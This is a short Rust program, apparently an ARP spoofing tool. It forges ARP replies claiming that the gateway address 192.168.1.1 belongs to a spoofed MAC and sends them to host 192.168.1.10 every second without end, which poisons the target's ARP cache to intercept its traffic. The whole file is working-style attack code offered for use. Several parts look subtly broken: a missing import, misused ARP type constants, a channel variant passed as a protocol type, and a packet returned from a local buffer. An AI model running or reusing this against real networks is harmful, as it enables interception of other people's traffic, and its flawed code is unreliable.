extern crate pnet;

use pnet::datalink::{self, Channel::Ethernet};
use pnet::packet::arp::{Arp, ArpPacket, ArpTypes};
use pnet::packet::{Packet, MutablePacket};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

fn build_arp_reply(src_mac: MacAddr, src_ip: Ipv4Addr, dst_mac: MacAddr, dst_ip: Ipv4Addr) -> ArpPacket {
    let mut arp_buffer = [0u8; 42];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpTypes::HardwareEthernet);
    arp_packet.set_protocol_type(Ethernet);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpTypes::Reply);
    arp_packet.set_sender_hw_addr(src_mac);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_target_hw_addr(dst_mac);
    arp_packet.set_target_proto_addr(dst_ip);
    arp_packet.to_immutable()
}

fn main() {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(|iface| iface.is_up() && !iface.ips.is_empty() && iface.is_broadcast()).unwrap();
    let (mut tx, _) = datalink::channel(&interface, Default::default()).unwrap();

    let target_mac = MacAddr::new(0x00, 0x0c, 0x29, 0x3e, 0x12, 0x9d);
    let target_ip = "192.168.1.10".parse().unwrap();
    let spoofed_mac = MacAddr::new(0x00, 0x0c, 0x29, 0x3e, 0x12, 0x9e);
    let spoofed_ip = "192.168.1.1".parse().unwrap();

    let arp_packet = build_arp_reply(spoofed_mac, spoofed_ip, target_mac, target_ip);

    loop {
        tx.send_to(&arp_packet.packet(), None).unwrap();
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
}
